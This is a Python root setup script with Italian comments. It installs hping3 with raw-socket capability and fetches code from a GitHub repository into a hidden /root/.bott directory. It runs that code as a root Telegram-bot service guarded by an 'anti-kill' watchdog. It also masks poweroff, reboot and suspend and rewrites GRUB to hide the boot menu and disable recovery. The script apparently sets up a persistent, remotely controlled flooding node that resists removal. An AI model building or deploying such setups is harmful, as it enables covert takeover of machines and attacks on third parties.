#!/usr/bin/env python3
import os
import sys
import subprocess

def run(cmd, fatal=False):
    print(f"[+] {cmd}")
    r = subprocess.run(cmd, shell=True)
    if fatal and r.returncode != 0:
        print("[!] ERRORE FATALE")
        sys.exit(1)

# =============================
# REQUIRE ROOT
# =============================
if os.geteuid() != 0:
    print("Devi eseguire questo script come root")
    sys.exit(1)

# =============================
# 1. INSTALL DIPENDENZE BASE
# =============================
run("apt update", fatal=True)
run(
    "apt install -y hping3 git curl build-essential "
    "libssl-dev zlib1g-dev libncurses5-dev libffi-dev libreadline-dev",
    fatal=True
)

# =============================
# 2. SETCAP HPING3
# =============================
if os.path.exists("/usr/sbin/hping3"):
    run("setcap cap_net_raw+ep /usr/sbin/hping3")

# =============================
# 3. PATH ROOT
# =============================
with open("/root/.bashrc", "a") as f:
    f.write("\nexport PATH=$PATH:/sbin:/usr/sbin\n")

# =============================
# 4. DISABILITA POWER / REBOOT / SUSPEND
# =============================
targets = [
    "ctrl-alt-del.target",
    "poweroff.target",
    "reboot.target",
    "suspend.target",
    "hibernate.target"
]
for t in targets:
    run(f"systemctl mask {t}")

# =============================
# 5. GRUB – NASCOSTO SICURO (NO RIMOZIONI)
# =============================
print("[+] Configurazione GRUB invisibile (safe mode)")

GRUB_DEFAULT = "/etc/default/grub"

with open(GRUB_DEFAULT, "w") as f:
    f.write("""GRUB_TIMEOUT=0
GRUB_TIMEOUT_STYLE=hidden
GRUB_HIDDEN_TIMEOUT=0
GRUB_DISABLE_RECOVERY=true
GRUB_DISABLE_SUBMENU=true
GRUB_FORCE_HIDDEN_MENU=true
GRUB_RECORDFAIL_TIMEOUT=0
GRUB_CMDLINE_LINUX_DEFAULT="quiet loglevel=0 systemd.show_status=false vt.global_cursor_default=0"
""")

# Applica configurazione GRUB (OBBLIGATORIO)
run("update-grub", fatal=True)

# =============================
# 6. INSTALL PYTHON 3.10
# =============================
run("cd /usr/src && curl -O https://www.python.org/ftp/python/3.10.14/Python-3.10.14.tgz", fatal=True)
run("cd /usr/src && tar xzf Python-3.10.14.tgz", fatal=True)
run("cd /usr/src/Python-3.10.14 && ./configure --enable-optimizations", fatal=True)
run("cd /usr/src/Python-3.10.14 && make -j$(nproc)", fatal=True)
run("cd /usr/src/Python-3.10.14 && make altinstall", fatal=True)

# =============================
# 7. BOT + LIBRERIE
# =============================
run("/usr/local/bin/python3.10 -m ensurepip", fatal=True)
run("/usr/local/bin/python3.10 -m pip install --upgrade pip", fatal=True)
run("/usr/local/bin/python3.10 -m pip install python-telegram-bot==13.15", fatal=True)

run("cd /root && git clone https://github.com/troiarcazzoguardi-dev/bott.git")

if os.path.exists("/root/bott"):
    run("mv /root/bott /root/.bott")
    run("chmod 711 /root/.bott")

# =============================
# 8. SERVICE BOT
# =============================
with open("/etc/systemd/system/bott.service", "w") as f:
    f.write("""[Unit]
Description=Telegram Bot
After=network.target

[Service]
Type=simple
User=root
WorkingDirectory=/root/.bott
ExecStart=/usr/local/bin/python3.10 /root/.bott/bott.py
Restart=always
RestartSec=5

[Install]
WantedBy=multi-user.target
""")

run("systemctl daemon-reload")
run("systemctl enable bott")
run("systemctl start bott")

# =============================
# 9. WATCHDOG ANTI-KILL
# =============================
with open("/etc/systemd/system/bott-watchdog.service", "w") as f:
    f.write("""[Unit]
Description=Bot Watchdog
After=bott.service

[Service]
Type=simple
ExecStart=/bin/bash -c 'while true; do systemctl is-active --quiet bott || systemctl restart bott; sleep 10; done'
Restart=always
RestartSec=5

[Install]
WantedBy=multi-user.target
""")

run("systemctl daemon-reload")
run("systemctl enable bott-watchdog")
run("systemctl start bott-watchdog")

print("""
[✓] COMPLETATO (SAFE)

- GRUB completamente nascosto
- Nessun menu visibile
- Recovery disabilitata
- Nessuna rimozione pericolosa
- Boot sempre garantito
- Bot attivo
- Watchdog anti-kill attivo
- Power / reboot / suspend disabilitati
""")
